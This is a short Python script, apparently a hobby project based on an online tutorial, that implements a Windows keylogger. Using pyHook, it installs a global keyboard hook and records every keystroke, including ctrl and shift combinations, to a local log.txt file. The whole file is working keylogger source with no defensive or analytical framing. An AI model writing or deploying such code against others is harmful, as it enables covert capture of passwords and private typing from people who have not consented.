from pyHook import HookManager, GetKeyState, HookConstants
from pythoncom import PumpMessages
from sys import stdout
from logging import basicConfig, log, DEBUG
import string

log_file = "log.txt"
basicConfig(filename="log.txt", level=DEBUG, format="%(message)s")


def ctrl_down():
    """ Determine if either control key is pressed

    """
    return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))

def shift_down():
    """ Determine if either shift key is pressed

    """
    return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))

def keylog(event):
    """ Properly record key presses

    """
    key=event.GetKey()
    ctrl = ctrl_down()
    shift = shift_down()
    if ctrl and shift:
        final_key = "ctrl+shift+"+key
    elif ctrl:
        if key in string.ascii_uppercase:
            final_key = "ctrl+"+key.lower()
        else:
            final_key = "ctrl+"+key
    elif shift:
        final_key = "shift+"+key
    else:
        if key in string.ascii_uppercase:
            final_key = key.lower()
        else:
            final_key = key
    log(10, final_key)


# keyboardhooking courtesy of
# http://www.tinkernut.com/2013/07/17/how-to-make-a-simple-python-keylogger
hook = HookManager()
hook.KeyDown = keylog
hook.HookKeyboard()
PumpMessages()

